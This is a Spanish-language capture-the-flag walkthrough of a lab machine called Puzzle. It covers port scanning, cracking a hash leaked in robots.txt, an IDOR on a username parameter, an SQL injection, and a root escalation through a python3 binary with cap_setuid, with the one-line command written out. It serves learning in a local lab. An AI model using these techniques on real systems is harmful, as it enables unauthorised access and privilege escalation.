![Screenshot](/medium/Puzzle/Images/machine.png)

Dificultad: **media**

Creado por: **Pyth0nK1d**

# Pasos para comprometer el sistema 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🔍 [Enumeración](#enumeración)
* 🪓 [Explotación](#explotación)
* 🚩 [Escalada de privilegios](#escalada-de-privilegios)

---

En primer lugar, nos aseguramos de que la máquina esté activa, lo cual podemos hacer con el comando **ping**.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.235 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.133 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.134 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2033ms
rtt min/avg/max/mdev = 0.133/0.167/0.235/0.047 ms
```

Ahora podemos comenzar con la fase de **reconocimiento**.

---

# Reconocimiento

Primero usamos **nmap** para escanear qué puertos están abiertos en el objetivo.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-26 12:48 -05
Initiating ARP Ping Scan at 12:48
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:48, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:48
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:48, 2.67s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2025-12-26 12:48:40 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.04 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le indicamos a nmap que escanee todos los puertos, desde el puerto 1 hasta el 65.535.

**-n** <- Con este argumento nmap omitirá la resolución DNS, lo cual es útil porque en algunos casos puede ralentizar el escaneo.

**-sS** <- Con este argumento nmap realizará un escaneo de tipo "stealth", es decir, no completará el handshake de tres vías, lo que hace el escaneo más rápido y menos detectable.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, lo que acelera aún más el escaneo.

**-Pn** <- Con este argumento nmap omitirá la fase de descubrimiento de hosts, tratando directamente al objetivo como activo.

**-vv** <- Con este argumento nmap mostrará los puertos descubiertos mientras el escaneo continúa, lo que permite ver los resultados en tiempo real.

**--open** <- Con este argumento solo se filtrarán los puertos abiertos.

Al finalizar el escaneo, vemos que hay dos puertos abiertos:

- Puerto 22 (ssh / Secure Shell)
- Puerto 80 (http / Hyper-Text Transfer Protocol)

Podemos usar nuevamente **nmap** para obtener más información sobre estos puertos, como los servicios y versiones que están ejecutándose.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target
```

**-p22,80** <- Con este argumento nmap solo escaneará estos dos puertos.

**-sCV** <- Con este argumento nmap verificará la versión de los servicios en cada puerto y ejecutará scripts para detectar posibles vulnerabilidades.

**-oX target** <- Con este argumento guardamos la salida en un archivo XML.

Después de que el escaneo finalice, tendremos una salida en formato XML, que convertiremos a HTML para verla más fácilmente.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo XML a HTML. Ahora abrimos el archivo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ open target.html
```

![Screenshot](/medium/Puzzle/Images/image1.png)

Podemos ver que ahora es más legible y visualmente agradable.

Observamos que existe un sitio web y también un **robots.txt** con algunas rutas.

Ahora, echemos un vistazo al sitio web con nuestro navegador.

![Screenshot](/medium/Puzzle/Images/image2.png)

El sitio web indica que necesitamos piezas para avanzar.

Vemos que existe un archivo **robots.txt**, así que vamos a revisarlo.

---

# Enumeración

Personalmente uso **curl** para ver el contenido del archivo de forma más clara.

```python
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ curl -s http://172.17.0.2/robots.txt
# Nota: Hay que hablar con el administrador. Se están dando muchas pistas de recursos secretos en este archivo. Debe haber otra solución...

User-agent: *
Disallow: /zona-prohibida/
Disallow: /secretos-ancestrales/
Disallow: /tesoro-escondido/
Disallow: /laboratorio-experimentos/
Disallow: /plan-maestro/
Disallow: /archivos-confidenciales/
Disallow: /puerta-alternativa/

--------

# Oye paco, te dejo hasheada aquí tu contraseña, guardala bien para que no tengas que estar preguntando todo el rato.
# 25c09c85575db0e238c4ac35783cc43c


# Pieza 1: RW5ob3JhYnVlbmEhIEhhcyBjb21wbGV0YWRvIGVzdGUg
```

Podemos ver aquí dos valores: un **hash** que parece ser de tipo MD5 y un valor en formato base64.

Primero, decodifiquemos el valor en base64.

```rust
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ echo "RW5ob3JhYnVlbmEhIEhhcyBjb21wbGV0YWRvIGVzdGUg" | base64 -d
Enhorabuena! Has completado este
```

Obtenemos la primera pieza.

Parece que el usuario **paco** tiene esta contraseña, así que intentaré encontrar cuál es su contraseña. Para ello, uso **crackstation** antes de hacer un ataque de fuerza bruta con mi propia máquina.

![Screenshot](/medium/Puzzle/Images/image3.png)

Podemos ver que la contraseña es: **rompecabezas**

Ahora intentemos iniciar sesión con el usuario **paco** usando esta contraseña.

![Screenshot](/medium/Puzzle/Images/image4.png)

Podemos ver este **panel de control**, pero no podemos hacer nada aquí, es solo decorativo.

Voy a revisar mi perfil personal para ver si tiene algo interesante.

![Screenshot](/medium/Puzzle/Images/image5.png)

Podemos ver algo muy interesante aquí: en la línea de la URL, hay un parámetro **?username=** y el usuario **paco**. Podemos intentar cambiar el valor de este parámetro para ver si podemos ver el contenido de otro usuario, como el usuario **admin**.

---

# Explotación

![Screenshot](/medium/Puzzle/Images/image6.png)

Hemos cambiado con éxito el valor y podemos ver el contenido del usuario **admin**.

Esta vulnerabilidad es un **IDOR** (Insecure Direct Object Reference), es decir, podemos acceder a objetos de otros usuarios sin validación adecuada.

Ahora, veamos la descripción del usuario admin, que parece contener su propia contraseña. Intentemos iniciar sesión con el usuario **admin** usando esta contraseña.

![Screenshot](/medium/Puzzle/Images/image7.png)

Iniciamos sesión como usuario **admin**.

Y obtenemos una zona de administrador y la segunda pieza.

```rust
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ echo "cHV6bGUgeSBwb3IgdGFudG8gc2UgdGUgb3RvcmdhbiBs" | base64 -d
puzle y por tanto se te otorgan l
```

Podemos ver que parece incompleto.

Ahora intentemos entrar en esta zona de administrador.

![Screenshot](/medium/Puzzle/Images/image8.png)

Podemos ver que hay un formato que necesitamos completar con una respuesta.

Hay algunas palabras clave en este texto:

- Consulta
- Sintaxis
- Logica
- Interpretación

Con estas palabras, podemos asumir que se trata de algo como una **inyección SQL**.

El formato debe estar en inglés, solo letras, sin espacios.

Vamos a probar estas palabras y ver si obtenemos éxito.

![Screenshot](/medium/Puzzle/Images/image9.png)

¡Y lo logramos! La palabra correcta es: **sqlinjection**

Obtenemos la tercera pieza.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ echo "YXMgbGxhdmVzIGRlbCByZWlubzoKClB5dGgwbksxZDpV" | base64 -d
as llaves del reino:

Pyth0nK1d:U
```

Ahora intentemos organizar estas piezas.

```
Enhorabuena! Has completado este puzle y por tanto se te otorgan las llaves del reino:

Pyth0nK1d:U
```

Nos falta la última pieza.

En esta página podemos intentar escribir un filtro.

![Screenshot](/medium/Puzzle/Images/image10.png)

Y con la respuesta anterior, podemos asumir que necesitamos realizar una **SQLI**.

![Screenshot](/medium/Puzzle/Images/image11.png)

Y parece que es correcto, este tipo de SQLI es basado en errores, aunque no muestre el mensaje de error del sistema, lo considero cuando hay un error del servidor.

![Screenshot](/medium/Puzzle/Images/image12.png)

Y obtenemos la cuarta pieza.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ echo "QiNmY0VwSzI2ZzkrISMqQz85Y1dENjVoYnQjZUcKCg==" | base64 -d
B#fcEpK26g9+!#*C?9cWD65hbt#eG
```

Ahora tenemos todas las piezas, así que volvamos a organizarlas.

```
Enhorabuena! Has completado este puzle y por tanto se te otorgan las llaves del reino:

Pyth0nK1d:UB#fcEpK26g9+!#*C?9cWD65hbt#eG
```

Tenemos credenciales de un usuario y parece que también su contraseña.

Ahora intentemos iniciar sesión con estas credenciales mediante SSH.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ ssh Pyth0nK1d@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:0uBNpAet6NSzOmFPJLX3bWyj56xQZNiZxve4MuhaCTU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
Pyth0nK1d@172.17.0.2's password: 
Linux 8a9bd5efe9f8 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Pyth0nK1d@8a9bd5efe9f8:~$
```

¡Y estamos dentro!

---

# Escalada de privilegios

Una vez dentro, podemos buscar formas de escalar privilegios. En este sistema, podemos hacerlo mediante **capacidades**.

```
Pyth0nK1d@8a9bd5efe9f8:~$ getcap -r / 2>/dev/null
/usr/local/bin/python3 cap_setuid=ep
```

Si no sabes qué son las capacidades, en resumen son un sistema más controlado que los **SUID**, permitiendo otorgar permisos específicos de forma más segura. Puedes consultar [aquí](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) para más detalles.

```
Pyth0nK1d@8a9bd5efe9f8:~$ ls -l /usr/local/bin/python3
-rwxr-xr-x 1 root root 6831736 Dec 18 20:21 /usr/local/bin/python3
```

Podemos ver que el dueño de este binario es el usuario **root**.

En este caso, la capacidad **cap_setuid** está asignada a este binario de Python3, por lo que podemos cambiar el **setuid** a 0 (que es el UID del usuario **root**).

Necesitamos ejecutar comandos para cambiar el UID a 0.

```r
Pyth0nK1d@8a9bd5efe9f8:~$ /usr/local/bin/python3 -c 'import os; os.setuid(0); os.system("bash")'
```

Con este comando cambiamos el UID a 0 y ejecutamos un comando **bash** como usuario **root**, lo que nos otorga una shell como **root**.

```
Pyth0nK1d@8a9bd5efe9f8:~$ /usr/local/bin/python3 -c 'import os; os.setuid(0); os.system("bash")'
root@8a9bd5efe9f8:~# whoami
root
root@8a9bd5efe9f8:~# cat /root/root.txt 
45f0088aed45a2407e50b6679842bfa2
```

¡Somos root y podemos leer la **bandera**! ***...pwned..!***
